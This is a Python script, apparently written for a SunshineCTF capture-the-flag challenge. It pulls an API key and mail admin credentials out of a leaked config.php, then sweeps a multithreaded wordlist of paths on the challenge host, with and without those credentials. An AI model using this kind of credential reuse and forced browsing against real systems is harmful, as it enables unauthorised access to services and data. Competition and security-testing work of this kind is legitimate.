#!/usr/bin/env python
"""Small wordlist: where does a password-bearing plaintext live on 443?"""
import base64, re, urllib.error, urllib.request, concurrent.futures as cf
CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
USER = re.search(r"MAIL_ADMIN_USER',\s*'([^']+)'", CFG).group(1)
PW = re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1)
BASIC = base64.b64encode(("%s:%s" % (USER, PW)).encode()).decode()
HOST = "vec.web.2026.sunshinectf.games"
WORDS = """api api2 v1 v2 internal web ui app admin dashboard login embed embeddings embedding vec
vector chroma chromadb collection collections query search documents document ids store db database
specs spec flag flags secret secrets password pass creds credentials config settings status health
heartbeat version mail mailhog webmail inbox messages message imap smtp mailstore tenant auth
preview view score similarity model inference predict upload download files file test dev staging
""".split()
EXT = ["", ".php", ".html", ".json", ".txt"]
def go(a):
    port, path, useauth = a
    url = "https://%s%s" % (HOST, path) if port == 443 else "http://%s:%d%s" % (HOST, port, path)
    req = urllib.request.Request(url, headers={"User-Agent": "x"} if not useauth else
                                 {"User-Agent": "x", "Authorization": "Basic " + BASIC,
                                  "X-API-Key": KEY})
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            return port, path, useauth, r.status, len(r.read()), r.read if False else b""
    except urllib.error.HTTPError as e:
        return port, path, useauth, e.code, len(e.read()), b""
    except Exception as e:
        return port, path, useauth, type(e).__name__, -1, b""
jobs = []
for w in WORDS:
    for e in EXT:
        jobs.append((443, "/" + w + e, False))
        jobs.append((443, "/" + w + e, True))
        jobs.append((8000, "/" + w + e, True))
res = {}
with cf.ThreadPoolExecutor(24) as ex:
    for port, path, ua, st, ln, _ in ex.map(go, jobs):
        res.setdefault((st, ln), []).append("%s:%d%s%s" % ("auth" if ua else "anon", port, path, ""))
for k in sorted(res, key=lambda k: -len(res[k])):
    print("### status=%s len=%s  (%d hits)" % (k[0], k[1], len(res[k])))
    for v in res[k][:15]:
        print("    ", v)
